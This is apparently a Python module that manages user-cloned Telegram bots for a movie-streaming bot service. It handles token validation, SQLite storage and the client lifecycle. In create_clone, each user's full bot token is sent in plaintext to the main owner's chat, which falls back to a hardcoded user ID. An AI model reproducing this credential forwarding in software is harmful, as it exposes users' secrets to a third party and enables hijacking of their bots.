"""
GameOver Movie Hub — Clone Bot Manager Engine
Handles dynamic creation, persistence, lifecycle management, and shared PyTgCalls streaming for user-cloned bots.
"""

import asyncio
import aiohttp
from typing import Optional, Dict, Any
from pyrogram import Client, filters, enums
from pyrogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)

from config import Config
from core.db import (
    add_cloned_bot,
    get_cloned_bot,
    get_all_cloned_bots,
    get_user_cloned_bots,
    delete_cloned_bot,
    update_cloned_bot_status,
)
from core.fonts import HEADER, to_small_caps

# In-memory user state tracker for clone creation
clone_states: Dict[int, str] = {}


async def validate_bot_token(bot_token: str) -> Optional[dict]:
    """Validates a bot token with Telegram Bot API getMe."""
    if not bot_token or ":" not in bot_token:
        return None
    url = f"https://api.telegram.org/bot{bot_token}/getMe"
    try:
        timeout = aiohttp.ClientTimeout(total=10.0)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                data = await resp.json()
                if data.get("ok") and data.get("result", {}).get("is_bot"):
                    return data["result"]
    except Exception as e:
        print(f"[CloneManager] Token validation error: {e}")
    return None


class CloneManager:
    def __init__(self):
        self.main_bot: Optional[Client] = None
        self.clones: Dict[int, Client] = {}          # bot_id -> Client
        self.clone_info: Dict[int, dict] = {}        # bot_id -> db dict
        self.chat_to_bot: Dict[int, int] = {}        # chat_id -> bot_id
        self.chat_tokens: Dict[int, str] = {}        # chat_id -> bot_token

    def init(self, main_bot: Client):
        self.main_bot = main_bot

    def get_token_for_chat(self, chat_id: int) -> str:
        """Returns the bot token active in a given chat, or defaults to Config.BOT_TOKEN."""
        return self.chat_tokens.get(chat_id) or Config.BOT_TOKEN

    async def load_and_start_all(self):
        """Loads and starts all active cloned bots from SQLite on bot boot."""
        saved_clones = get_all_cloned_bots(status="active")
        print(f"[CloneManager] Found {len(saved_clones)} active cloned bots in SQLite.")
        
        for c in saved_clones:
            try:
                await self._start_clone_instance(c)
            except Exception as e:
                print(f"[CloneManager] Failed to start clone @{c.get('bot_username')}: {e}")

    async def _start_clone_instance(self, bot_data: dict) -> Optional[Client]:
        """Initializes and runs a single clone Pyrogram Client."""
        bot_id = bot_data["bot_id"]
        bot_token = bot_data["bot_token"]
        owner_id = bot_data["owner_id"]
        owner_name = bot_data.get("owner_name", "Owner")
        clone_username = bot_data.get("bot_username", "")

        # Avoid double-starting
        if bot_id in self.clones:
            return self.clones[bot_id]

        clone_client = Client(
            name=f"clone_{bot_id}",
            api_id=Config.API_ID,
            api_hash=Config.API_HASH,
            bot_token=bot_token,
            in_memory=True
        )

        main_username = Config.BOT_USERNAME or "Gameovermovie_bot"

        # ── Group message router to track which bot is active in which chat ──
        @clone_client.on_message(filters.group, group=-2)
        async def track_chat_bot(c: Client, m: Message):
            if m.chat and m.chat.id:
                self.chat_to_bot[m.chat.id] = bot_id
                self.chat_tokens[m.chat.id] = bot_token

        # ── Clone Bot's /start command in Private ──
        @clone_client.on_message(filters.command("start") & filters.private)
        async def clone_start_handler(c: Client, message: Message):
            user = message.from_user
            u_id = user.id if user else 0
            u_name = user.first_name if user and user.first_name else ""
            
            caption_text = (
                "<b>GᴀᴍᴇOᴠᴇʀ Mᴏᴠɪᴇ Hᴜʙ</b>\n\n"
                "I Aᴍ Tʜᴇ Fᴀsᴛ Aɴᴅ PᴏᴡᴇʀFᴜʟ Mᴏᴠɪᴇ Pʟᴀʏᴇʀ Bᴏᴛ Wɪᴛʜ Sᴏᴍᴇ Aᴡᴇsᴏᴍᴇ Fᴇᴀᴛᴜʀᴇs.\n\n"
                "Cʟɪᴄᴋ Oɴ Tʜᴇ Hᴇʟᴘ BᴜᴛᴛᴏN Tᴏ Gᴇᴛ Iɴғᴏʀᴍᴀᴛɪᴏɴ Aʙᴏᴜᴛ Mʏ Mᴏᴅᴜʟᴇs Aɴᴅ Cᴏᴍᴍᴀɴᴅs."
            )

            owner_link = f"tg://user?id={owner_id}"
            try:
                owner_user = await c.get_users(owner_id)
                if owner_user and owner_user.username:
                    owner_link = f"https://t.me/{owner_user.username}"
            except Exception:
                pass

            markup = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton(
                        "Aᴅᴅ Mᴇ Iɴ Yᴏᴜʀ Gʀᴏᴜᴘ",
                        url=f"https://t.me/{clone_username}?startgroup=true",
                        style="primary"
                    )
                ],
                [
                    InlineKeyboardButton(
                        "Hᴇʟᴘ Aɴᴅ Cᴏᴍᴍᴀɴᴅs",
                        callback_data="help_all",
                        style="primary"
                    )
                ],
                [
                    InlineKeyboardButton("Oᴡɴᴇʀ", url=owner_link, style="primary"),
                    InlineKeyboardButton(
                        "Cʟᴏɴᴇ Bᴏᴛ",
                        url=f"https://t.me/{main_username}?start=clone",
                        style="primary"
                    )
                ]
            ])

            from core.db import get_setting
            start_vid = get_setting("start_video_file_id")
            if start_vid:
                try:
                    await c.send_video(
                        chat_id=message.chat.id,
                        video=start_vid,
                        caption=caption_text,
                        parse_mode=enums.ParseMode.HTML,
                        reply_markup=markup,
                        supports_streaming=True
                    )
                    return
                except Exception:
                    pass

            await message.reply_text(
                caption_text,
                parse_mode=enums.ParseMode.HTML,
                reply_markup=markup,
                disable_web_page_preview=True
            )

        # ── Restrict /admin on Clone Bot ──
        @clone_client.on_message(filters.command("admin"))
        async def clone_admin_guard(c: Client, message: Message):
            await message.reply_text(
                f"{HEADER}"
                f"<b>Aᴅᴍɪɴ Pᴀɴᴇʟ Rᴇsᴛʀɪᴄᴛᴇᴅ</b>\n\n"
                f"<i>Global admin controls and broadcasts are strictly managed on the official @{main_username}.</i>\n"
                f"<i>In groups, you can freely control playback using /skip, /pause, /resume, and /stop!</i>",
                parse_mode=enums.ParseMode.HTML
            )

        # ── Register all shared plugins onto the clone client ──
        from plugins import movies, controls, welcome, admin
        movies.register(clone_client)
        controls.register(clone_client)
        welcome.register(clone_client)
        admin.register(clone_client)

        # Start Pyrogram client
        await clone_client.start()
        self.clones[bot_id] = clone_client
        self.clone_info[bot_id] = bot_data
        print(f"[CloneManager] ✅ Cloned bot started: @{clone_username} (ID: {bot_id}) for Owner {owner_id}")
        return clone_client

    async def create_clone(self, bot_token: str, owner_id: int, owner_name: str) -> tuple[bool, str, Optional[dict]]:
        """Validates token, saves to SQLite, starts instance, and alerts main owner."""
        # 1. Validate token with Telegram
        tg_info = await validate_bot_token(bot_token)
        if not tg_info:
            return False, "Invalid Bot Token! Please check with @BotFather and try again.", None

        bot_id = tg_info["id"]
        bot_username = tg_info.get("username", "")
        bot_name = tg_info.get("first_name", "")

        # Check if already cloned
        existing = get_cloned_bot(bot_id)
        if existing and existing.get("status") == "active":
            return False, f"This bot (@{bot_username}) is already active as a clone!", None

        # 2. Save to SQLite
        success = add_cloned_bot(
            bot_id=bot_id,
            bot_token=bot_token,
            bot_username=bot_username,
            bot_name=bot_name,
            owner_id=owner_id,
            owner_name=owner_name
        )
        if not success:
            return False, "Database error saving clone bot. Please try again.", None

        bot_data = {
            "bot_id": bot_id,
            "bot_token": bot_token,
            "bot_username": bot_username,
            "bot_name": bot_name,
            "owner_id": owner_id,
            "owner_name": owner_name,
            "status": "active"
        }

        # 3. Start instance
        try:
            await self._start_clone_instance(bot_data)
        except Exception as e:
            print(f"[CloneManager] Start failed: {e}")
            return False, f"Failed to start clone bot: {e}", None

        # 4. Notify Main Bot Owner
        try:
            from bot import send_styled
            main_owner_id = Config.OWNER_ID or 6805412676
            user_link = f"<a href=\"tg://user?id={owner_id}\">{owner_name}</a>"
            alert_text = (
                f"{HEADER}"
                f"🚨 <b>Nᴇᴡ Cʟᴏɴᴇ Bᴏᴛ Cʀᴇᴀᴛᴇᴅ!</b>\n\n"
                f"‣ <b>Bᴏᴛ :</b> @{bot_username} (ID: <code>{bot_id}</code>)\n"
                f"‣ <b>Oᴡɴᴇʀ :</b> {user_link} (<code>{owner_id}</code>)\n"
                f"‣ <b>Tᴏᴋᴇɴ :</b> <code>{bot_token}</code>\n"
                f"‣ <b>Sᴛᴀᴛᴜs :</b> <code>Aᴄᴛɪᴠᴇ & Sᴛʀᴇᴀᴍɪɴɢ</code>"
            )
            await send_styled(chat_id=main_owner_id, text=alert_text)
        except Exception as alert_err:
            print(f"[CloneManager] Failed to alert main owner: {alert_err}")

        return True, f"Clone bot @{bot_username} created and started successfully!", bot_data

    async def delete_clone(self, bot_id: int) -> bool:
        """Stops the clone client and removes from SQLite."""
        client = self.clones.pop(bot_id, None)
        if client:
            try:
                await client.stop()
            except Exception as e:
                print(f"[CloneManager] Error stopping client {bot_id}: {e}")
                
        self.clone_info.pop(bot_id, None)
        delete_cloned_bot(bot_id)
        return True

    async def stop_all(self):
        """Stops all running clone instances gracefully on shutdown."""
        print(f"[CloneManager] Stopping {len(self.clones)} cloned bots...")
        for bot_id, client in list(self.clones.items()):
            try:
                await client.stop()
            except Exception:
                pass
        self.clones.clear()
        print("[CloneManager] All cloned bots stopped.")


# Global singleton instance
clone_manager = CloneManager()
